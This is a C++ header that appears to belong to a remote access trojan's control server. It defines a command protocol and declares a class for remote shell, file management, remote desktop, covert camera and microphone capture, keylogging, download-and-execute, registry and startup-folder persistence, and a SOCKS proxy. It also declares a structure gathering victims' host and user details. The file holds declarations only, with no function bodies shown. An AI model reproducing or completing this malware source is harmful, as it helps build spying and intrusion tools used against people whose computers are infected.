#pragma once
#include "EventHandler.h"
	
#define KNEL	('K'|('N'<<8)|('E'<<16)|('L'<<24))



#define KNEL_LOGIN (0xee01)
//
#define KNEL_READY			(0x4552)

#define KNEL_POWER_REBOOT	(0xee02)
#define KNEL_POWER_SHUTDOWN	(0xee03)
#define KNEL_RESTART		(0xea04)


#define KNEL_EDITCOMMENT	(0xee04)
#define KNEL_EDITCOMMENT_OK	(0xee05)

#define KNEL_UPLOAD_MODULE_FROMDISK		(0xee08)
#define KNEL_UPLOAD_MODULE_FORMURL		(0xee09)



#define KNEL_ERROR			(0xea08)


#define KNEL_MODULE_BUSY				(0xdd00)
#define KNEL_CMD						(0xdd01)
#define KNEL_CHAT						(0xdd02)
#define KNEL_FILEMGR					(0xdd03)
#define KNEL_DESKTOP					(0xdd04)
#define KNEL_CAMERA						(0xdd05)
#define KNEL_MICROPHONE					(0xdd06)
#define KNEL_DOWNANDEXEC				(0xdd07)
#define KNEL_EXIT						(0xdd08)
#define KNEL_KEYBD_LOG					(0xdd09)


#define KNEL_UTILS_COPYTOSTARTUP		(0xdd0a)
#define KNEL_UTILS_WRITE_REG			(0xdd0b)


#define KNEL_PROXY_SOCKSPROXY			(0xdd0c)
#define KNEL_UTILS_OPEN_WEBPAGE			(0xdd0d)
#define KNEL_PROCESSMANAGER				(0xdd0e)



//获取模块信息....
#define KNEL_GETMODULE_INFO	(0xea05)
#define KNEL_MODULE_INFO	(0xea07)

#define KNEL_MODULE_CHUNK_GET	(0xfa00)
#define KNEL_MODULE_CHUNK_DAT	(0xfa01)


//Notify Message:
#define WM_KERNEL_LOGIN					(WM_USER + 401)
#define WM_KERNEL_LOGOUT				(WM_USER + 402)

#define WM_CLIENT_BLOCK					(WM_USER + 403)
#define WM_CLIENT_EDITCOMMENT			(WM_USER + 404)

#define WM_KERNEL_ERROR					(WM_USER + 405)
#define WM_KERNEL_UPDATE_UPLODA_STATU	(WM_USER + 406)

#define WM_KERNEL_GET_MODULE_PATH		(WM_USER + 407)

class CKernelSrv :
	public CEventHandler
{
public:
	typedef struct LoginInfo
	{
		TCHAR szPrivateIP[128];				//
		TCHAR szHostName[128];
		TCHAR szUser[128];
		TCHAR szOsName[128];
		TCHAR szInstallDate[128];
		TCHAR szCPU[128];
		TCHAR szDisk_RAM[128];
		DWORD dwHasCamera;
		DWORD dwPing;
		TCHAR szComment[256];

	}LoginInfo;
	
	//module transport.
	TCHAR	m_szModulePath[MAX_PATH];
	TCHAR	m_szCurrentModuleName[MAX_PATH];
	HANDLE	m_hModuleFile;
	UINT64  m_LastGetTime;
	BYTE *  m_lpBuffer;

private:
	void OnClose() ;	
	void OnOpen();		


	void OnEvent(UINT32 e, BYTE *lpData, UINT32 Size);;

	void OnLogin(LoginInfo *pLi);

	CString getIPLocation(const CString & ip_address);

	void OnGetModuleInfo(const TCHAR*ModuleName);
	void OnGetModuleChunk(char * ChunkInfo);

public:
	CString GetLocation();
	CString GetPublicIP();


	void EditComment(TCHAR *Comment);
	void Power_Reboot();
	void Power_Shutdown();
	void Restart();

	void OnError(TCHAR * Error);
	void UploadModuleFromDisk(TCHAR* Path);
	void UploadModuleFromUrl(TCHAR* Url);

	void BeginCmd();
	void BeginChat();
	void BeginFileMgr();
	void BeginRemoteDesktop();
	void BeginCamera();
	void BeginMicrophone();
	void BeginDownloadAndExec(TCHAR szUrl[]);
	void BeginExit();
	void BeginKeyboardLog();
	void BeginProcessManager();
	void BeginProxy_Socks();
	void UtilsWriteStartupReg();
	void UtilsCopyToStartupMenu();
	void UtilsOpenWebpage(TCHAR * szUrl);

	//----------------------------------------------
	CKernelSrv(CClient *pClient);
	~CKernelSrv();
};

